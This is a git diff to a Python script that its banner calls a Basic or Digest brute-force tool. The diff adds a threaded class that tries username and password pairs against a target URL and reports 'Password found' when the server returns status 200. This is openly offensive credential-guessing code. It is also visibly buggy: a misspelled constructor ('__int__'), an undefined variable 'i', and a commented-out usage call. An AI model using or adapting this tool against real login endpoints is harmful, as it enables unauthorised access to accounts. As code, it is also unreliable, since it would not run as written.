@@ -13,10 +13,37 @@ hit = "1"
 def banner():
     print('******** Base or Digest Brute Force**********')
 
+class request_performer(Thread):
+    def __int__(self,passwords, user,url, method):
+        Thread.__int__(self)
+        self.password = passwords.split("\n")[0]
+        self.username = user
+        self.url = url
+        self.method = method
+        print("--"+ self.password + "--")
+    
+    def run(self):
+        global hit 
+        if  hit == "1":
+            try:
+                if self.method == "basic":
+                    r = requests.get(self.url, auth=(self.username, self.password))
+                elif self.method == "digest":
+                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
+                
+                if r.status_code == 200 :
+                    hit = "0"
+                    print("Password found - " + self.password + " -- User " + self.username)
+                else:
+                    print("Not valid password .. " + self.password)
+                    i[0] = i[0]-1
+                    
+            except Exception as e:
+                print(e)
 def start(argv):
     banner()
     if len(sys.argv) < 5:
-        usage()
+        ##usage()
         sys.exit()
     try:
         opts, args = getopt.getopt(argv, "u:w:f:m:t")
